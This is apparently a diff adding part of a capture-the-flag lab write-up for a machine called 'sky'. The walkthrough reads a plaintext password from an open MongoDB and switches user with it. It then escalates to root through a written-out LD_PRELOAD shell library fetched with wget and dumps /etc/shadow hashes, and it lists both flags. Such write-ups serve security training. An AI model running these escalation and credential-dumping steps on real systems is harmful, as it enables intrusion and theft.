@@ -232,3 +232,237 @@ cat user.txt
 63191e4ece37523c9fe6bb62a5e64d45
 
 www-data@sky:/home/webdeveloper$ getent passwd
+getent passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+webdeveloper:x:1000:1000:webdeveloper:/home/webdeveloper:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+mongodb:x:114:65534::/home/mongodb:/usr/sbin/nologin
+root:x:0:0:root:/root:/bin/sh
+nobody:x:65534:65534:nobody:/:/usr/sbin/nologin
+
+The `getent` command is a Unix and Linux utility that is used to retrieve information from various databases, including the passwd database, group database, and network services databases. The `getent` command can be used to retrieve information from databases that are not stored in traditional text files, such as LDAP, NIS, and DNS.
+
+For example, `getent passwd` retrieves all the user account information from the passwd database, and `getent group` retrieves all the group information from the group database.
+
+www-data@sky:/home/webdeveloper$ ss -tulpn
+ss -tulpn
+Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
+udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
+udp   UNCONN 0      0       10.10.38.167%eth0:68           0.0.0.0:*            
+tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*            
+tcp   LISTEN 0      511             127.0.0.1:9000         0.0.0.0:*            
+tcp   LISTEN 0      4096            127.0.0.1:27017        0.0.0.0:*            
+tcp   LISTEN 0      151             127.0.0.1:3306         0.0.0.0:*            
+tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
+tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
+tcp   LISTEN 0      511                     *:80                 *:*            
+tcp   LISTEN 0      128                  [::]:22              [::]:* 
+
+ss is the command name in Linux systems that stands for "socket statistics."
+`ss` is a Linux command that can be used to display detailed information about network sockets and connections. The `ss -tulpn` command specifically displays information about TCP sockets.
+
+Here's what each option in the command means:
+
+-   `-t`: displays information about TCP sockets
+-   `-u`: displays information about UDP sockets
+-   `-l`: shows listening sockets
+-   `-p`: shows the process using the socket
+-   `-n`: displays numeric IP addresses and port numbers
+
+www-data@sky:/home/webdeveloper$ mongo 127.0.0.1
+mongo 127.0.0.1
+MongoDB shell version v4.4.6
+connecting to: mongodb://127.0.0.1:27017/test?compressors=disabled&gssapiServiceName=mongodb
+Implicit session: session { "id" : UUID("544ac835-ee71-4083-94ba-090580f30a19") }
+MongoDB server version: 4.4.6
+Welcome to the MongoDB shell.
+For interactive help, type "help".
+For more comprehensive documentation, see
+	https://docs.mongodb.com/
+Questions? Try the MongoDB Developer Community Forums
+	https://community.mongodb.com
+---
+The server generated these startup warnings when booting: 
+        2023-02-26T17:22:15.416+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
+        2023-02-26T17:23:01.674+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
+---
+---
+        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
+        metrics about your deployment (disk utilization, CPU, operation statistics, etc).
+
+        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
+        and anyone you share the URL with. MongoDB may use this information to make product
+        improvements and to suggest MongoDB products and deployment options to you.
+
+        To enable free monitoring, run the following command: db.enableFreeMonitoring()
+        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
+---
+> show dbs
+shshow dbs
+admin   0.000GB
+backup  0.000GB
+config  0.000GB
+local   0.000GB
+> use backup;
+ususe backup;
+switched to db backup
+> shwo collections;
+shshwo collections;
+uncaught exception: SyntaxError: unexpected token: identifier :
+@(shell):1:5
+> show collections;
+shshow collections;
+collection
+user
+> db.user.find();
+dbdb.user.find();
+{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
+{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
+{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
+{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
+{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
+
+www-data@sky:/home/webdeveloper$ su webdeveloper
+su webdeveloper
+Password: BahamasChapp123!@#
+
+webdeveloper@sky:~$ sudo -l
+sudo -l
+Matching Defaults entries for webdeveloper on sky:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
+
+User webdeveloper may run the following commands on sky:
+    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat shell.c 
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+}
+
+`LD_PRELOAD` is an environment variable in Linux and Unix-based operating systems that allows a user to override the dynamic linker/loader's default search path and preload a shared library before any other shared library. The specified library will be loaded into memory first, and any symbols defined in it will override those of the same name in subsequently loaded libraries.
+
+webdeveloper@sky:~$ pwd
+pwd
+/home/webdeveloper
+webdeveloper@sky:~$ ls
+ls
+user.txt
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+webdeveloper@sky:~$ wget http://10.8.19.103:8080/shell.c
+wget http://10.8.19.103:8080/shell.c
+--2023-02-26 20:13:08--  http://10.8.19.103:8080/shell.c
+Connecting to 10.8.19.103:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 198 [text/x-csrc]
+Saving to: ‘shell.c’
+
+shell.c             100%[===================>]     198  --.-KB/s    in 0s      
+
+2023-02-26 20:13:08 (28.8 MB/s) - ‘shell.c’ saved [198/198]
+
+webdeveloper@sky:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+webdeveloper@sky:~$ ls
+ls
+shell.c  shell.so  user.txt  wget-log
+webdeveloper@sky:~$ sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
+<LOAD=/home/webdeveloper/shell.so sky_backup_utility
+root@sky:/home/webdeveloper# cd /root
+cd /root
+root@sky:~# ls
+ls
+root.txt
+root@sky:~# cat root.txt
+cat root.txt
+3a62d897c40a815ecbe267df2f533ac6
+root@sky:~# getent shadow
+getent shadow
+root:$6$D8GdRREdfi4yvaze$3qCes0B6IQ/MdgU3VjvNBINrhH8vzjHb3k0YX6QalQNxdHD.Ece.LoNWnc4xzXElJeOFYXAvQv/N8ldxpRrgd0:18907:0:99999:7:::
+daemon:*:18659:0:99999:7:::
+bin:*:18659:0:99999:7:::
+sys:*:18659:0:99999:7:::
+sync:*:18659:0:99999:7:::
+games:*:18659:0:99999:7:::
+man:*:18659:0:99999:7:::
+lp:*:18659:0:99999:7:::
+mail:*:18659:0:99999:7:::
+news:*:18659:0:99999:7:::
+uucp:*:18659:0:99999:7:::
+proxy:*:18659:0:99999:7:::
+www-data:*:18659:0:99999:7:::
+backup:*:18659:0:99999:7:::
+list:*:18659:0:99999:7:::
+irc:*:18659:0:99999:7:::
+gnats:*:18659:0:99999:7:::
+nobody:*:18659:0:99999:7:::
+systemd-network:*:18659:0:99999:7:::
+systemd-resolve:*:18659:0:99999:7:::
+systemd-timesync:*:18659:0:99999:7:::
+messagebus:*:18659:0:99999:7:::
+syslog:*:18659:0:99999:7:::
+_apt:*:18659:0:99999:7:::
+tss:*:18659:0:99999:7:::
+uuidd:*:18659:0:99999:7:::
+tcpdump:*:18659:0:99999:7:::
+landscape:*:18659:0:99999:7:::
+pollinate:*:18659:0:99999:7:::
+usbmux:*:18772:0:99999:7:::
+sshd:*:18772:0:99999:7:::
+systemd-coredump:!!:18772::::::
+webdeveloper:$6$YSyMbUSLeGmMA09W$aatY7ldcbEDftJhl1RUlaCXd1OThl0n8HkZU5vCvd7EcmYQlED9RHkf13jh/UATFQstwTk5Mlnx66SWNZk.zT.:18773:0:99999:7:::
+lxd:!:18772::::::
+mysql:!:18772:0:99999:7:::
+mongodb:*:18772:0:99999:7:::
+```
+- ![[Pasted image 20230226125734.png]]
+- What is the user.txt flag?
+- *63191e4ece37523c9fe6bb62a5e64d45*
+- What is the root.txt flag?
+- *3a62d897c40a815ecbe267df2f533ac6*
+
+## Notes / Lessons Learned
+[[Anonymous]]
+
